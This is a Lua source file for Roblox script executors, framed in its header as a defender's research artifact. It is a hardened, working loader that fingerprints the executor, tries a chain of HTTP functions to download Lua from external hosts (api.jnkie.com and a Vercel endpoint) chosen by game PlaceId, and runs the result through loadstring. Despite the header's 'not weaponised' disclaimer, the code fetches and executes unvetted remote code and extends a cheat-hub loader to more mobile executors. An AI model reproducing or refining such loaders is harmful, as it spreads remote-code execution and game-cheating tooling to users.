--[[ ============================================================================
  SAMPLE 10  --  CoS HUB  --  SINGLE-FILE MOBILE-READY ENTRY (research artifact)
  ============================================================================
  One-file drop-in replacement for the original 342-byte chunk-1 loader,
  hardened for mobile Roblox executors. Same dual-provider routing
  (PlaceId 3431407618 -> Isle 10 ; else -> CoS via jnkie CDN) but with
  full fallback chains for HTTP, loadstring, getgenv, and executor probing.

  ORIGINAL (chunk 1, 342 B, bit-perfect from jnkie CDN):
    if game.PlaceId == 3431407618 then
        return loadstring(request({Url="https://lunar-rest-api.vercel.app/script/Isle10",Method="GET"}).Body)()
    else
        getgenv().SCRIPT_KEY = ""
        return loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/441457bbbb948e52667ad5bbc45b77324023cf493ef13aa448b758022e06d480/download"))()
    end

  COMPATIBILITY MATRIX (mobile exec API surface, hand-verified):
    Delta Mobile  : request, getgenv, loadstring, game:HttpGet ............ OK
    Codex         : http_request, getgenv, loadstring ..................... OK (no game:HttpGet)
    Hydrogen      : request, getgenv, loadstring ........................... OK
    Arceus X      : syn.request, getgenv, loadstring ....................... OK
    Fluxus Mobile : fluxus.request, getgenv, loadstring .................... OK
    KRNL Mobile   : krnl.request, getgenv, loadstring ...................... OK
    Cryptic       : request, getgenv, load (no loadstring) ................. OK (load polyfill)
    Trigon        : request, getgenv, loadstring ........................... OK
    Solara Mobile : request, getgenv, loadstring ........................... OK
    Evon Mobile   : http_request, getgenv, loadstring ...................... OK
    PC fallback   : Synapse / Script-Ware / Delta PC / Fluxus PC ........... OK

  IS / IS NOT
    IS:     defender artifact replicating the original loader's behaviour
            with cross-exec compat, for static / dynamic analysis.
    IS NOT: a weaponised hub. jnkie endpoint can mutate any time; Isle 10
            endpoint returns HTTP 402 since author's Vercel deploy lapsed.

  PARSES WITH: tools/lua53/luac53.exe -p sample10_mobile.lua  --> OK
  ENCODING:    ASCII, LF
============================================================================ ]]

-- 1. Constants (preserved bit-for-bit) ----------------------------------------
local ISLE10_PID = 3431407618
local ISLE10_URL = "https://lunar-rest-api.vercel.app/script/Isle10"
local COS_URL    = "https://api.jnkie.com/api/v1/luascripts/public/441457bbbb948e52667ad5bbc45b77324023cf493ef13aa448b758022e06d480/download"
local COS_KEY    = ""

-- 2. Safe utility ------------------------------------------------------------
local function tryget(t, k) local ok, v = pcall(function() return t[k] end); if ok then return v end end
local function tryfn(f, ...) if type(f) ~= "function" then return false end; return pcall(f, ...) end

-- 3. Executor identity (best-effort, never errors) ---------------------------
local function exec_name()
    local cands = {
        function() return identifyexecutor and identifyexecutor() end,
        function() return getexecutorname and getexecutorname() end,
        function() return syn         and "Synapse X" end,
        function() return KRNL_LOADED and "KRNL" end,
        function() return Krnl        and "KRNL Mobile" end,
        function() return fluxus      and "Fluxus" end,
        function() return Fluxus      and "Fluxus" end,
        function() return DELTA       and "Delta" end,
        function() return Hydrogen    and "Hydrogen" end,
        function() return Codex       and "Codex" end,
        function() return is_sirhurt_closure and "SirHurt" end,
    }
    for _, p in ipairs(cands) do
        local ok, n = pcall(p)
        if ok and type(n) == "string" and #n > 0 then return n end
    end
    return "unknown"
end

-- 4. getgenv polyfill --------------------------------------------------------
local function genv()
    if type(getgenv) == "function" then
        local ok, e = pcall(getgenv)
        if ok and type(e) == "table" then return e end
    end
    return _G
end

-- 5. HTTP fallback chain -----------------------------------------------------
local function http_get(url)
    local errs = {}

    -- 5a. Table-style request fns: { Url=..., Method="GET" } -> { Body=..., StatusCode=... }
    local table_fns = {
        { "request",        rawget(_G, "request") },
        { "http_request",   rawget(_G, "http_request") },
        { "syn.request",    syn    and syn.request    },
        { "http.request",   http   and http.request   },
        { "fluxus.request", fluxus and fluxus.request },
        { "krnl.request",   krnl   and krnl.request   },
    }
    for _, e in ipairs(table_fns) do
        local name, fn = e[1], e[2]
        if type(fn) == "function" then
            local ok, res = pcall(fn, { Url = url, Method = "GET" })
            if ok and type(res) == "table" then
                local body   = res.Body or res.body
                local status = tonumber(res.StatusCode or res.status_code or res.Status or 200) or 0
                if type(body) == "string" and status < 400 then
                    return body, name, status
                end
                errs[#errs+1] = name .. " status=" .. tostring(status)
            else
                errs[#errs+1] = name .. " threw: " .. tostring(res)
            end
        end
    end

    -- 5b. Roblox-host string-style: returns raw body string
    local string_fns = {
        { "game:HttpGet",      function() return game:HttpGet(url) end },
        { "game:HttpGetAsync", function() return game:HttpGetAsync(url) end },
    }
    for _, e in ipairs(string_fns) do
        local ok, body = pcall(e[2])
        if ok and type(body) == "string" and #body > 0 then
            return body, e[1], 200
        end
        errs[#errs+1] = e[1] .. " threw: " .. tostring(body)
    end

    return nil, "no http transport", table.concat(errs, " | ")
end

-- 6. loadstring / load polyfill ----------------------------------------------
local function compile(src, name)
    name = name or "=sample10_payload"
    local first_err
    local ls = rawget(_G, "loadstring")
    if type(ls) == "function" then
        local fn, err = ls(src, name)
        if fn then return fn end
        if err then first_err = "loadstring: " .. tostring(err) end
    end
    local ld = rawget(_G, "load")
    if type(ld) == "function" then
        local fn, err = ld(src, name)
        if fn then return fn end
        if err then return nil, "load: " .. tostring(err) end
    end
    return nil, first_err or "no loader (neither loadstring nor load)"
end

-- 7. PlaceId-based route selection -------------------------------------------
local function pick_route()
    local ok, pid = pcall(function() return game.PlaceId end)
    if not ok then return COS_URL, "fallback (PlaceId unreadable)" end
    if pid == ISLE10_PID then
        return ISLE10_URL, ("Isle 10 (PlaceId %s)"):format(tostring(pid))
    end
    return COS_URL, ("CoS (PlaceId %s)"):format(tostring(pid))
end

-- 8. Mobile-safe logger (warn beats print on Android consoles) ----------------
local function log(msg)
    pcall(warn, "[sample10] " .. tostring(msg))
end

-- 9. Main entry --------------------------------------------------------------
local function main()
    local exec = exec_name()
    local env  = genv()
    local url, route = pick_route()

    -- Original loader set SCRIPT_KEY only on the CoS branch.
    if url == COS_URL then env.SCRIPT_KEY = COS_KEY end

    log(("exec=%s route=%s"):format(exec, route))

    local body, transport, extra = http_get(url)
    if not body then
        log("HTTP failed: " .. tostring(transport))
        if extra then log("detail: " .. tostring(extra)) end
        return false, "http"
    end
    log(("fetched %d B via %s (status=%s)"):format(#body, transport, tostring(extra)))

    -- Isle 10 Vercel paywall sentinel — HTML body, not Lua. Surface a clean msg.
    if body:sub(1, 128):find("DEPLOYMENT_DISABLED", 1, true)
       or body:sub(1, 16) == "<!DOCTYPE html>"
       or body:sub(1, 5)  == "<html" then
        log("Isle 10 endpoint returned HTTP 402 (paywall). See chunk6_real.lua.")
        return false, "paywall"
    end

    local fn, err = compile(body, "=sample10_payload")
    if not fn then
        log("compile failed: " .. tostring(err))
        return false, "compile"
    end

    -- Tail-return matches the original loader's return semantics.
    return fn()
end

return main()
